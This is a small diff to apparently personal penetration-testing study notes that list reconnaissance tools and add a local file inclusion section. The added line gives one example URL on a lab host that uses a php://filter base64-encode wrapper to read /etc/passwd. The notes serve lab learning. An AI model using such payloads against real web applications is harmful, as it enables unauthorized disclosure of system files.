@@ -362,3 +362,7 @@ https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation
  - Wappalyzer (https://www.wappalyzer.com/) is an online tool and browser extension that helps identify what technologies a website uses, such as frameworks, Content Management Systems (CMS), payment processors and much more, and it can even find version numbers as well.
  - https://github.com/aboul3la/Sublist3r
  - https://www.kali.org/tools/ffuf/
+
+ 
+ LFI
+ - displaying php: http://example.thm.labs/page.php?file=php://filter/convert.base64-encode/resource=/etc/passwd
